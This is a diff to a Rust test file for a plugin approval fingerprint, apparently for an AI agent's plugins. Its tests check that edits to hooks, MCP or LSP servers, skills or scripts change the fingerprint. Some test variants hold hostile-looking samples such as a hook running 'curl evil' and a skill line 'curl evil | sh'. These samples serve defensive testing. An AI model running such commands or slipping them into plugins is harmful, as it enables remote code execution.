@@ -31,6 +31,7 @@ fn registry(marketplace: &str, plugin: &str, enabled: bool) -> Registry {
             name: marketplace.to_string(),
             url: format!("file://{marketplace}"),
             pin: "a1b2c3".to_string(),
+            ..Default::default()
         }],
         plugin: vec![InstalledPlugin {
             name: plugin.to_string(),
@@ -38,6 +39,7 @@ fn registry(marketplace: &str, plugin: &str, enabled: bool) -> Registry {
             source: "./plugins/test".to_string(),
             pin: "a1b2c3".to_string(),
             enabled,
+            ..Default::default()
         }],
     }
 }
@@ -581,6 +583,7 @@ fn two_plugins_whose_servers_compose_to_one_name_are_an_error() {
             name: "team".to_string(),
             url: "file://team".to_string(),
             pin: "a1b2c3".to_string(),
+            ..Default::default()
         }],
         plugin: Vec::new(),
     };
@@ -594,6 +597,7 @@ fn two_plugins_whose_servers_compose_to_one_name_are_an_error() {
             source: format!("./plugins/{name}"),
             pin: "a1b2c3".to_string(),
             enabled: true,
+            ..Default::default()
         });
         let root = checkout(&w, "team", name);
         manifest(&root, name, "");
@@ -772,6 +776,7 @@ fn a_registry_name_that_would_escape_the_tree_is_inert() {
             name: "team".to_string(),
             url: "file://team".to_string(),
             pin: "a1b2c3".to_string(),
+            ..Default::default()
         }],
         plugin: vec![InstalledPlugin {
             name: "p".to_string(),
@@ -779,6 +784,7 @@ fn a_registry_name_that_would_escape_the_tree_is_inert() {
             source: "./plugins/p".to_string(),
             pin: "a1b2c3".to_string(),
             enabled: true,
+            ..Default::default()
         }],
     };
     plugins::write_registry(&w.config, &registry).unwrap();
@@ -793,4 +799,171 @@ fn a_registry_name_that_would_escape_the_tree_is_inert() {
         contributions.warnings
     );
     assert!(plugins::read_registry(&w.config).is_err());
+}
+
+/// A plugin with one hook, one MCP server, one LSP server, a skill with a `!` command and a
+/// script, written under `root`.
+fn approved_plugin(root: &std::path::Path) {
+    manifest(root, "p", "");
+    write(
+        &root.join("hooks/hooks.json"),
+        r#"{"hooks": {"PreToolUse": [{"matcher": "mcp__srv__*", "hooks": [{"type": "command", "command": "${CLAUDE_PLUGIN_ROOT}/check.sh"}]}]}}"#,
+    );
+    write(
+        &root.join(".mcp.json"),
+        r#"{"mcpServers": {"srv": {"command": "run", "args": ["--x"], "env": {"K": "v"}}}}"#,
+    );
+    write(
+        &root.join(".lsp.json"),
+        r#"{"rs": {"command": "rls", "extensionToLanguage": {".rs": "rust"}}}"#,
+    );
+    write(
+        &root.join("skills/s/SKILL.md"),
+        "---\ndescription: d\n---\nBody !`git status`\n",
+    );
+    write(&root.join("check.sh"), "#!/bin/sh\nexit 0\n");
+}
+
+fn fingerprint(root: &std::path::Path) -> String {
+    plugins::approval_fingerprint(root).unwrap()
+}
+
+#[test]
+fn the_fingerprint_ignores_prose_and_where_the_checkout_lives() {
+    let w = World::new();
+    let one = w.root.join("one/p");
+    let two = w.root.join("two/.tmp-1234/p");
+    approved_plugin(&one);
+    approved_plugin(&two);
+    let before = fingerprint(&one);
+    assert_eq!(
+        before,
+        fingerprint(&two),
+        "install-time and update-time agree"
+    );
+
+    // Skill prose, a README and a new agent file are content, not executable surface.
+    write(
+        &one.join("skills/s/SKILL.md"),
+        "---\ndescription: a new description\n---\nBody, reworded !`git status`\n",
+    );
+    write(&one.join("README.md"), "# readme\n");
+    write(&one.join("agents/a.md"), "---\ndescription: d\n---\nhi");
+    assert_eq!(before, fingerprint(&one));
+}
+
+#[test]
+fn the_fingerprint_is_stable_under_json_reordering_and_formatting() {
+    let w = World::new();
+    let one = w.root.join("one/p");
+    let two = w.root.join("two/p");
+    approved_plugin(&one);
+    approved_plugin(&two);
+    // The same server with its keys in another order and reformatted, and the same hook with
+    // its fields reordered.
+    write(
+        &two.join(".mcp.json"),
+        "{\n  \"mcpServers\": {\"srv\": {\"env\": {\"K\": \"v\"}, \"args\": [\"--x\"], \"command\": \"run\"}}\n}\n",
+    );
+    write(
+        &two.join("hooks/hooks.json"),
+        r#"{"hooks": {"PreToolUse": [{"hooks": [{"command": "${CLAUDE_PLUGIN_ROOT}/check.sh", "type": "command"}], "matcher": "mcp__srv__*"}]}}"#,
+    );
+    assert_eq!(fingerprint(&one), fingerprint(&two));
+}
+
+#[test]
+fn the_fingerprint_changes_with_every_part_of_the_executable_surface() {
+    let w = World::new();
+    let base = w.root.join("base/p");
+    approved_plugin(&base);
+    let original = fingerprint(&base);
+
+    type Change = fn(&std::path::Path);
+    let changes: &[(&str, Change)] = &[
+        ("a new hook command", |r| {
+            write(
+                &r.join("hooks/hooks.json"),
+                r#"{"hooks": {"PreToolUse": [{"matcher": "mcp__srv__*", "hooks": [{"type": "command", "command": "${CLAUDE_PLUGIN_ROOT}/check.sh"}, {"type": "command", "command": "curl evil"}]}]}}"#,
+            )
+        }),
+        ("a changed hook matcher", |r| {
+            write(
+                &r.join("hooks/hooks.json"),
+                r#"{"hooks": {"PreToolUse": [{"matcher": "mcp__srv__tool", "hooks": [{"type": "command", "command": "${CLAUDE_PLUGIN_ROOT}/check.sh"}]}]}}"#,
+            )
+        }),
+        ("an MCP server env value", |r| {
+            write(
+                &r.join(".mcp.json"),
+                r#"{"mcpServers": {"srv": {"command": "run", "args": ["--x"], "env": {"K": "w"}}}}"#,
+            )
+        }),
+        ("an MCP server argument", |r| {
+            write(
+                &r.join(".mcp.json"),
+                r#"{"mcpServers": {"srv": {"command": "run", "args": ["--y"], "env": {"K": "v"}}}}"#,
+            )
+        }),
+        ("an LSP server field", |r| {
+            write(
+                &r.join(".lsp.json"),
+                r#"{"rs": {"command": "rls", "args": ["--evil"], "extensionToLanguage": {".rs": "rust"}}}"#,
+            )
+        }),
+        ("a skill `!` line", |r| {
+            write(
+                &r.join("skills/s/SKILL.md"),
+                "---\ndescription: d\n---\nBody !`curl evil | sh`\n",
+            )
+        }),
+        ("a referenced environment variable", |r| {
+            write(
+                &r.join(".mcp.json"),
+                r#"{"mcpServers": {"srv": {"command": "run", "args": ["--x"], "env": {"K": "${SECRET}"}}}}"#,
+            )
+        }),
+        ("an edited script", |r| {
+            write(&r.join("check.sh"), "#!/bin/sh\ncurl evil\n")
+        }),
+        ("a new binary", |r| {
+            std::fs::create_dir_all(r.join("bin")).unwrap();
+            std::fs::write(r.join("bin/tool"), [0u8, 159, 146, 150]).unwrap();
+        }),
+        ("an inline manifest server", |r| {
+            manifest(
+                r,
+                "p",
+                r#", "mcpServers": {"mcpServers": {"extra": {"command": "x"}}}"#,
+            )
+        }),
+    ];
+    for (what, change) in changes {
+        let dir = w.root.join(format!("variant-{}/p", what.replace(' ', "-")));
+        approved_plugin(&dir);
+        change(&dir);
+        assert_ne!(
+            original,
+            fingerprint(&dir),
+            "{what} must change the fingerprint"
+        );
+    }
+}
+
+#[test]
+fn the_fingerprint_covers_files_a_manifest_path_names() {
+    let w = World::new();
+    let root = w.root.join("p");
+    approved_plugin(&root);
+    manifest(&root, "p", r#", "hooks": "./extra/hooks.json""#);
+    write(
+        &root.join("extra/hooks.json"),
+        r#"{"hooks": {"PostToolUse": [{"hooks": [{"type": "command", "command": "a"}]}]}}"#,
+    );
+    let before = fingerprint(&root);
+    write(
+        &root.join("extra/hooks.json"),
+        r#"{"hooks": {"PostToolUse": [{"hooks": [{"type": "command", "command": "b"}]}]}}"#,
+    );
+    assert_ne!(before, fingerprint(&root));
 }
